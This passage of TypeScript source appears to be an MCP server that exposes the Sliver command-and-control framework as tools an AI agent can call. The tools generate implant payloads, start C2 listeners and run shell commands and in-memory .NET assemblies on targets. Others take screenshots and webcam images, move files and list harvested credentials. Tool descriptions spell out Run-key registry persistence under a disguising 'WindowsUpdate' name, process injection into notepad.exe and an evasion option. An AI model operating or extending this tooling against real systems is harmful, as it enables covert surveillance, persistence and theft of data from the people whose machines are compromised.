        const jsonMatch = stdout.match(/\{[\s\S]*\}/);
        if (jsonMatch) {
          const result = JSON.parse(jsonMatch[0]);
          if (result.error) {
            reject(new Error(result.error));
          } else {
            resolve(result.data);
          }
        } else {
          reject(new Error(`No JSON in output: ${stdout}`));
        }
      } catch (e) {
        reject(new Error(`Failed to parse output: ${stdout}\nError: ${e}`));
      }
    });

    python.on("error", (err: Error) => {
      reject(err);
    });
  });
}

// Tool definitions
const SLIVER_TOOLS: Tool[] = [
  // Server info
  {
    name: "sliver_version",
    description: "Get Sliver server version information",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "sliver_operators",
    description: "List all connected operators",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },

  // Sessions
  {
    name: "sliver_sessions",
    description:
      "List all active sessions (real-time implant connections)",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "sliver_kill_session",
    description: "Kill/terminate a session",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID to kill",
        },
      },
      required: ["session_id"],
    },
  },

  // Beacons
  {
    name: "sliver_beacons",
    description:
      "List all beacons (asynchronous callback implants)",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },

  // Listeners/Jobs
  {
    name: "sliver_listeners",
    description: "List all active listeners/jobs",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "sliver_start_mtls",
    description: "Start an mTLS (mutual TLS) listener",
    inputSchema: {
      type: "object",
      properties: {
        host: {
          type: "string",
          description: "Host to bind to (default: 0.0.0.0)",
          default: "0.0.0.0",
        },
        port: {
          type: "number",
          description: "Port to listen on (default: 8888)",
          default: 8888,
        },
      },
      required: [],
    },
  },
  {
    name: "sliver_start_https",
    description: "Start an HTTPS listener",
    inputSchema: {
      type: "object",
      properties: {
        host: {
          type: "string",
          description: "Host to bind to (default: 0.0.0.0)",
          default: "0.0.0.0",
        },
        port: {
          type: "number",
          description: "Port to listen on (default: 443)",
          default: 443,
        },
        domain: {
          type: "string",
          description: "Domain for the listener",
        },
      },
      required: [],
    },
  },
  {
    name: "sliver_start_http",
    description: "Start an HTTP listener",
    inputSchema: {
      type: "object",
      properties: {
        host: {
          type: "string",
          description: "Host to bind to (default: 0.0.0.0)",
          default: "0.0.0.0",
        },
        port: {
          type: "number",
          description: "Port to listen on (default: 80)",
          default: 80,
        },
        domain: {
          type: "string",
          description: "Domain for the listener",
        },
      },
      required: [],
    },
  },
  {
    name: "sliver_start_dns",
    description: "Start a DNS listener",
    inputSchema: {
      type: "object",
      properties: {
        domains: {
          type: "array",
          items: { type: "string" },
          description: "Domains for DNS C2",
        },
      },
      required: ["domains"],
    },
  },
  {
    name: "sliver_start_wg",
    description: "Start a WireGuard listener",
    inputSchema: {
      type: "object",
      properties: {
        port: {
          type: "number",
          description: "Port to listen on (default: 53)",
          default: 53,
        },
      },
      required: [],
    },
  },
  {
    name: "sliver_kill_listener",
    description: "Stop/kill a listener job",
    inputSchema: {
      type: "object",
      properties: {
        job_id: {
          type: "number",
          description: "Job ID to kill",
        },
      },
      required: ["job_id"],
    },
  },

  // Implant builds
  {
    name: "sliver_implant_builds",
    description: "List all implant builds",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "sliver_implant_profiles",
    description: "List all implant generation profiles",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },

  // Session file operations
  {
    name: "sliver_ls",
    description: "List files on target (session)",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        path: {
          type: "string",
          description: "Path to list (default: current directory)",
          default: ".",
        },
      },
      required: ["session_id"],
    },
  },
  {
    name: "sliver_pwd",
    description: "Get current working directory on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
      },
      required: ["session_id"],
    },
  },
  {
    name: "sliver_cd",
    description: "Change directory on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        path: {
          type: "string",
          description: "Path to change to",
        },
      },
      required: ["session_id", "path"],
    },
  },
  {
    name: "sliver_mkdir",
    description: "Create directory on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        path: {
          type: "string",
          description: "Directory path to create",
        },
      },
      required: ["session_id", "path"],
    },
  },
  {
    name: "sliver_rm",
    description: "Remove file or directory on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        path: {
          type: "string",
          description: "Path to remove",
        },
        recursive: {
          type: "boolean",
          description: "Remove recursively",
          default: false,
        },
      },
      required: ["session_id", "path"],
    },
  },
  {
    name: "sliver_download",
    description: "Download file from target (session). Provide local_path to save to disk.",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        remote_path: {
          type: "string",
          description: "Remote path to download",
        },
        local_path: {
          type: "string",
          description: "Local path to save file (e.g. /tmp/output.dat). Leave empty to get size only.",
        },
      },
      required: ["session_id", "remote_path"],
    },
  },
  {
    name: "sliver_upload",
    description: "Upload file to target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        local_path: {
          type: "string",
          description: "Local file path",
        },
        remote_path: {
          type: "string",
          description: "Remote destination path",
        },
      },
      required: ["session_id", "local_path", "remote_path"],
    },
  },

  // Command execution
  {
    name: "sliver_execute",
    description: "Execute a program on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        exe: {
          type: "string",
          description: "Executable path",
        },
        args: {
          type: "array",
          items: { type: "string" },
          description: "Arguments",
          default: [],
        },
        output: {
          type: "boolean",
          description: "Capture output",
          default: true,
        },
      },
      required: ["session_id", "exe"],
    },
  },
  {
    name: "sliver_shell",
    description: "Execute a shell command on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        command: {
          type: "string",
          description: "Shell command to execute",
        },
      },
      required: ["session_id", "command"],
    },
  },

  // System enumeration
  {
    name: "sliver_ps",
    description: "List processes on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
      },
      required: ["session_id"],
    },
  },
  {
    name: "sliver_ifconfig",
    description: "Get network interfaces on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
      },
      required: ["session_id"],
    },
  },
  {
    name: "sliver_netstat",
    description: "Get network connections on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
      },
      required: ["session_id"],
    },
  },
  {
    name: "sliver_screenshot",
    description: "Take a screenshot on target (session), saves PNG to disk",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        save_path: {
          type: "string",
          description: "Local path to save PNG (default: /tmp/session_screenshot.png)",
          default: "/tmp/session_screenshot.png",
        },
      },
      required: ["session_id"],
    },
  },
  {
    name: "sliver_beacon_execute_bof",
    description: "Execute a BOF (Beacon Object File) on a beacon. Polls for result until timeout. For GetWebcam BOF: provide bof_path to GetWebcam.o and save_path for output JPEG.",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        bof_path: { type: "string", description: "Local path to .o BOF file (e.g. ~/.sliver/armory/.../GetWebcam.o)" },
        args: {
          type: "array",
          items: { type: "string" },
          description: "BOF arguments as base64-encoded byte arrays",
          default: [],
        },
        save_path: { type: "string", description: "Local path to save binary output (e.g. /tmp/webcam.jpg). Leave empty to get text output." },
        timeout: { type: "number", description: "Seconds to wait for beacon (default: 120)", default: 120 },
      },
      required: ["beacon_id", "bof_path"],
    },
  },
  {
    name: "sliver_beacon_open_session",
    description: "Open an interactive session from a beacon (queues OpenSession task, polls until session appears). Session must be closed after use.",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: {
          type: "string",
          description: "Beacon ID to open session from",
        },
        timeout: {
          type: "number",
          description: "Seconds to wait for beacon to check in (default: 120)",
          default: 120,
        },
      },
      required: ["beacon_id"],
    },
  },
  {
    name: "sliver_beacon_rm",
    description: "Remove/delete a dead beacon from Sliver server. Does not kill remote process.",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: {
          type: "string",
          description: "Beacon ID to remove",
        },
      },
      required: ["beacon_id"],
    },
  },
  {
    name: "sliver_beacon_execute",
    description: "Execute a command on a beacon (async, waits for check-in). Use instead of session_execute for beacon targets.",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        exe: { type: "string", description: "Executable to run (e.g. powershell.exe, cmd.exe)" },
        args: {
          type: "array",
          items: { type: "string" },
          description: "Arguments list",
          default: [],
        },
        output: { type: "boolean", description: "Capture output (default: true)", default: true },
        timeout: { type: "number", description: "Seconds to wait for beacon check-in (default: 120)", default: 120 },
      },
      required: ["beacon_id", "exe"],
    },
  },
  {
    name: "sliver_beacon_upload",
    description: "Upload a file to a beacon target (async, waits for check-in).",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        local_path: { type: "string", description: "Local file path to upload" },
        remote_path: { type: "string", description: "Remote destination path on target" },
        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
      },
      required: ["beacon_id", "local_path", "remote_path"],
    },
  },
  {
    name: "sliver_beacon_screenshot",
    description: "Take a screenshot on a beacon target (async, waits for check-in). Saves PNG to disk.",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        save_path: { type: "string", description: "Local path to save PNG (default: /tmp/beacon_screenshot.png)", default: "/tmp/beacon_screenshot.png" },
        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
      },
      required: ["beacon_id"],
    },
  },
  {
    name: "sliver_beacon_download",
    description: "Download a file from a beacon target (async, waits for check-in). Provide local_path to save to disk.",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        remote_path: { type: "string", description: "Remote file path on target" },
        local_path: { type: "string", description: "Local path to save file (e.g. /tmp/output.dat)" },
        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
      },
      required: ["beacon_id", "remote_path"],
    },
  },
  {
    name: "sliver_beacon_ls",
    description: "List files on a beacon target (async, waits for check-in).",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        path: { type: "string", description: "Path to list (default: .)", default: "." },
        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
      },
      required: ["beacon_id"],
    },
  },
  {
    name: "sliver_beacon_ps",
    description: "List processes on a beacon target (async, waits for check-in).",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
      },
      required: ["beacon_id"],
    },
  },
  {
    name: "sliver_beacon_ifconfig",
    description: "Get network interfaces on a beacon target (async, waits for check-in).",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
      },
      required: ["beacon_id"],
    },
  },
  {
    name: "sliver_beacon_registry_read",
    description: "Read a Windows registry value from a beacon target (async).",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        hive: { type: "string", description: "Registry hive: HKCU, HKLM, HKCR, HKU, HKCC", default: "HKCU" },
        path: { type: "string", description: "Registry path (e.g. Software/Microsoft/Windows/CurrentVersion/Run)" },
        key: { type: "string", description: "Value name (e.g. WindowsUpdate)" },
        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
      },
      required: ["beacon_id", "path", "key"],
    },
  },
  {
    name: "sliver_beacon_registry_write",
    description: "Write a Windows registry value on a beacon target (async). For persistence: hive=HKCU, path=Software/Microsoft/Windows/CurrentVersion/Run, reg_type=REG_SZ.",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        hive: { type: "string", description: "Registry hive: HKCU, HKLM", default: "HKCU" },
        path: { type: "string", description: "Registry path (e.g. Software/Microsoft/Windows/CurrentVersion/Run)" },
        key: { type: "string", description: "Value name (e.g. WindowsUpdate)" },
        string_value: { type: "string", description: "String value to write (for REG_SZ)", default: "" },
        dword_value: { type: "number", description: "DWORD value (for REG_DWORD)", default: 0 },
        reg_type: { type: "string", description: "REG_SZ, REG_EXPAND_SZ, REG_DWORD, REG_QWORD, REG_BINARY", default: "REG_SZ" },
        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
      },
      required: ["beacon_id", "path", "key"],
    },
  },
  {
    name: "sliver_registry_read",
    description: "Read a Windows registry value via session (synchronous).",
    inputSchema: {
      type: "object",
      properties: {
        session_id: { type: "string", description: "Session ID" },
        hive: { type: "string", description: "Registry hive: HKCU, HKLM, HKCR", default: "HKCU" },
        path: { type: "string", description: "Registry path (e.g. Software/Microsoft/Windows/CurrentVersion/Run)" },
        key: { type: "string", description: "Value name" },
      },
      required: ["session_id", "path", "key"],
    },
  },
  {
    name: "sliver_registry_write",
    description: "Write a Windows registry value via session (synchronous). For persistence: hive=HKCU, path=Software/Microsoft/Windows/CurrentVersion/Run, reg_type=REG_SZ.",
    inputSchema: {
      type: "object",
      properties: {
        session_id: { type: "string", description: "Session ID" },
        hive: { type: "string", description: "Registry hive: HKCU, HKLM", default: "HKCU" },
        path: { type: "string", description: "Registry path" },
        key: { type: "string", description: "Value name" },
        string_value: { type: "string", description: "String value (REG_SZ)", default: "" },
        dword_value: { type: "number", description: "DWORD value", default: 0 },
        reg_type: { type: "string", description: "REG_SZ, REG_EXPAND_SZ, REG_DWORD, REG_BINARY", default: "REG_SZ" },
      },
      required: ["session_id", "path", "key"],
    },
  },
  {
    name: "sliver_beacon_execute_assembly",
    description: "Execute a .NET assembly in-memory on a beacon target (async). Use for armory tools like Seatbelt, SharpUp, etc.",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        assembly_path: { type: "string", description: "Local path to .NET assembly (.exe or .dll)" },
        arguments: { type: "string", description: "Arguments string passed to the assembly", default: "" },
        process: { type: "string", description: "Host process to inject into (default: notepad.exe)", default: "notepad.exe" },
        is_dll: { type: "boolean", description: "Is the assembly a DLL", default: false },
        arch: { type: "string", description: "Architecture: x86_64 or x86", default: "x86_64" },
        class_name: { type: "string", description: "Class name (for DLL only)", default: "" },
        method: { type: "string", description: "Method to call (for DLL only)", default: "Main" },
        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
      },
      required: ["beacon_id", "assembly_path"],
    },
  },
  {
    name: "sliver_execute_assembly",
    description: "Execute a .NET assembly in-memory via session (synchronous). Use for armory tools like Seatbelt, SharpUp, etc.",
    inputSchema: {
      type: "object",
      properties: {
        session_id: { type: "string", description: "Session ID" },
        assembly_path: { type: "string", description: "Local path to .NET assembly (.exe or .dll)" },
        arguments: { type: "string", description: "Arguments string", default: "" },
        process: { type: "string", description: "Host process (default: notepad.exe)", default: "notepad.exe" },
        is_dll: { type: "boolean", description: "Is a DLL", default: false },
        arch: { type: "string", description: "x86_64 or x86", default: "x86_64" },
        class_name: { type: "string", description: "Class name (DLL only)", default: "" },
        method: { type: "string", description: "Method (DLL only)", default: "Main" },
      },
      required: ["session_id", "assembly_path"],
    },
  },
  {
    name: "sliver_rename_beacon",
    description: "Rename a beacon for better OPSEC/organization.",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        name: { type: "string", description: "New name for the beacon" },
      },
      required: ["beacon_id", "name"],
    },
  },
  {
    name: "sliver_beacon_tasks",
    description: "List pending and completed tasks for a beacon.",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
      },
      required: ["beacon_id"],
    },
  },
  {
    name: "sliver_prune_beacons",
    description: "Delete all dead/overdue beacons from the server. Equivalent to 'beacons prune' in Sliver console.",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "sliver_generate",
    description: "Generate a new implant/beacon payload. Saves binary to local disk. Use save_path ending in .exe for Windows.",
    inputSchema: {
      type: "object",
      properties: {
        c2: {
          type: "array",
          items: { type: "string" },
          description: "C2 URLs (e.g. [\"https://c2.proxmoxlab.cloud\"])",
        },
        save_path: { type: "string", description: "Local path to save generated binary (e.g. /tmp/beacon.exe)" },
        goos: { type: "string", description: "Target OS: windows, linux, darwin", default: "windows" },
        goarch: { type: "string", description: "Target arch: amd64, 386, arm64", default: "amd64" },
        is_beacon: { type: "boolean", description: "true=beacon (async), false=session (interactive)", default: true },
        format: { type: "string", description: "EXECUTABLE, SHARED_LIB, SHELLCODE, SERVICE", default: "EXECUTABLE" },
        name: { type: "string", description: "Custom implant name (optional)", default: "" },
        beacon_interval: { type: "number", description: "Beacon check-in interval in seconds (default: 60)", default: 60 },
        beacon_jitter: { type: "number", description: "Jitter in seconds (default: 30)", default: 30 },
        evasion: { type: "boolean", description: "Enable evasion features", default: false },
      },
      required: ["c2", "save_path"],
    },
  },

  // Pivots
  {
    name: "sliver_pivot_listeners",
    description: "List pivot listeners on session",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
      },
      required: ["session_id"],
    },
  },
  {
    name: "sliver_pivot_start_tcp",
    description: "Start a TCP pivot listener on session",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        port: {
          type: "number",
          description: "Port to listen on (default: 9898)",
          default: 9898,
        },
      },
      required: ["session_id"],
    },
  },

  // Credentials & Hosts
  {
    name: "sliver_creds",
    description: "List harvested credentials",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "sliver_hosts",
    description: "List discovered hosts",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
];

// Create the MCP server
const server = new Server(
  {
    name: "sliver-c2-mcp",
    version: "1.0.0",
  },
  {
    capabilities: {
      tools: {},
    },
  }
);

// Handle tool listing
server.setRequestHandler(ListToolsRequestSchema, async () => {
  return { tools: SLIVER_TOOLS };
});

// Handle tool execution
server.setRequestHandler(CallToolRequestSchema, async (request) => {
  const { name, arguments: args } = request.params;

  try {
    let result: unknown;

    switch (name) {
      case "sliver_version":
        result = await executeSliverCommand("version");
        break;

      case "sliver_operators":
        result = await executeSliverCommand("operators");
        break;

      case "sliver_sessions":
        result = await executeSliverCommand("sessions");
        break;

      case "sliver_kill_session":
        result = await executeSliverCommand("kill_session", args as Record<string, unknown>);
        break;

      case "sliver_beacons":
        result = await executeSliverCommand("beacons");
        break;

      case "sliver_listeners":
        result = await executeSliverCommand("jobs");
        break;

      case "sliver_start_mtls":
        result = await executeSliverCommand("start_mtls_listener", args as Record<string, unknown>);
        break;

      case "sliver_start_https":
        result = await executeSliverCommand("start_https_listener", args as Record<string, unknown>);
        break;

      case "sliver_start_http":
        result = await executeSliverCommand("start_http_listener", args as Record<string, unknown>);
        break;

      case "sliver_start_dns":
        result = await executeSliverCommand("start_dns_listener", args as Record<string, unknown>);
        break;

      case "sliver_start_wg":
        result = await executeSliverCommand("start_wg_listener", args as Record<string, unknown>);
        break;

      case "sliver_kill_listener":
        result = await executeSliverCommand("kill_job", args as Record<string, unknown>);
        break;

      case "sliver_implant_builds":
        result = await executeSliverCommand("implant_builds");
        break;

      case "sliver_implant_profiles":
        result = await executeSliverCommand("implant_profiles");
        break;

      case "sliver_ls":
        result = await executeSliverCommand("session_ls", args as Record<string, unknown>);
        break;

      case "sliver_pwd":
        result = await executeSliverCommand("session_pwd", args as Record<string, unknown>);
        break;

      case "sliver_cd":
        result = await executeSliverCommand("session_cd", args as Record<string, unknown>);
        break;

      case "sliver_mkdir":
        result = await executeSliverCommand("session_mkdir", args as Record<string, unknown>);
        break;

      case "sliver_rm":
        result = await executeSliverCommand("session_rm", args as Record<string, unknown>);
        break;

      case "sliver_download":
        result = await executeSliverCommand("session_download", args as Record<string, unknown>);
        break;

      case "sliver_upload":
        result = await executeSliverCommand("session_upload", args as Record<string, unknown>);
        break;

      case "sliver_execute":
        result = await executeSliverCommand("session_execute", args as Record<string, unknown>);
        break;

      case "sliver_shell":
        result = await executeSliverCommand("session_shell", args as Record<string, unknown>);
        break;

      case "sliver_ps":
        result = await executeSliverCommand("session_ps", args as Record<string, unknown>);
        break;

      case "sliver_ifconfig":
        result = await executeSliverCommand("session_ifconfig", args as Record<string, unknown>);
        break;

      case "sliver_netstat":
        result = await executeSliverCommand("session_netstat", args as Record<string, unknown>);
        break;

      case "sliver_screenshot":
        result = await executeSliverCommand("session_screenshot", args as Record<string, unknown>);
        break;

      case "sliver_beacon_execute_bof":
        result = await executeSliverCommand("beacon_execute_bof", args as Record<string, unknown>);
        break;

      case "sliver_beacon_open_session":
        result = await executeSliverCommand("beacon_open_session", args as Record<string, unknown>);
        break;

      case "sliver_beacon_rm":
        result = await executeSliverCommand("beacon_rm", args as Record<string, unknown>);
        break;

      case "sliver_beacon_execute":
        result = await executeSliverCommand("beacon_execute", args as Record<string, unknown>);
        break;

      case "sliver_beacon_upload":
        result = await executeSliverCommand("beacon_upload", args as Record<string, unknown>);
        break;

      case "sliver_beacon_screenshot":
        result = await executeSliverCommand("beacon_screenshot", args as Record<string, unknown>);
        break;

      case "sliver_beacon_download":
        result = await executeSliverCommand("beacon_download", args as Record<string, unknown>);
        break;

      case "sliver_beacon_ls":
        result = await executeSliverCommand("beacon_ls", args as Record<string, unknown>);
        break;

      case "sliver_beacon_ps":
        result = await executeSliverCommand("beacon_ps", args as Record<string, unknown>);
        break;

      case "sliver_beacon_ifconfig":
        result = await executeSliverCommand("beacon_ifconfig", args as Record<string, unknown>);
        break;

      case "sliver_beacon_registry_read":
        result = await executeSliverCommand("beacon_registry_read", args as Record<string, unknown>);
        break;

      case "sliver_beacon_registry_write":
        result = await executeSliverCommand("beacon_registry_write", args as Record<string, unknown>);
        break;

      case "sliver_registry_read":
        result = await executeSliverCommand("session_registry_read", args as Record<string, unknown>);
        break;

      case "sliver_registry_write":
        result = await executeSliverCommand("session_registry_write", args as Record<string, unknown>);
        break;

      case "sliver_beacon_execute_assembly":
        result = await executeSliverCommand("beacon_execute_assembly", args as Record<string, unknown>);
        break;

      case "sliver_execute_assembly":
        result = await executeSliverCommand("session_execute_assembly", args as Record<string, unknown>);
        break;

      case "sliver_rename_beacon":
        result = await executeSliverCommand("rename_beacon", args as Record<string, unknown>);
        break;

      case "sliver_beacon_tasks":
        result = await executeSliverCommand("beacon_tasks", args as Record<string, unknown>);
        break;

      case "sliver_prune_beacons":
        result = await executeSliverCommand("prune_beacons");
        break;

      case "sliver_generate":
        result = await executeSliverCommand("generate_implant", args as Record<string, unknown>);
        break;

      case "sliver_pivot_listeners":
        result = await executeSliverCommand("pivot_listeners", args as Record<string, unknown>);
        break;

      case "sliver_pivot_start_tcp":
        result = await executeSliverCommand("pivot_start_tcp", args as Record<string, unknown>);
        break;

      case "sliver_creds":
        result = await executeSliverCommand("creds");
        break;

      case "sliver_hosts":
        result = await executeSliverCommand("hosts");
        break;

      default:
        throw new Error(`Unknown tool: ${name}`);
    }

    const content: TextContent[] = [
      {
        type: "text",
        text: JSON.stringify(result, null, 2),
      },
    ];

    return { content };
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      content: [
        {
          type: "text",
          text: `Error: ${errorMessage}`,
        },
      ],
      isError: true,
    };
  }
});

// Main entry point
async function main() {
  // Validate configuration
  if (!config.operatorConfigPath) {
    console.error(
      "Warning: No operator config specified. Use --operator-config flag or SLIVER_OPERATOR_CONFIG env var"
    );
  } else if (!existsSync(config.operatorConfigPath)) {
    console.error(`Warning: Operator config file not found: ${config.operatorConfigPath}`);
  }

  // Check if sliver-py is installed
  try {
    execSync(`${config.pythonPath} -c "import sliver"`, { stdio: "pipe" });
  } catch {
    console.error(
      "Warning: sliver-py not installed. Install with: pip install sliver-py"
    );
  }

  const transport = new StdioServerTransport();
  await server.connect(transport);
}

main().catch(console.error);
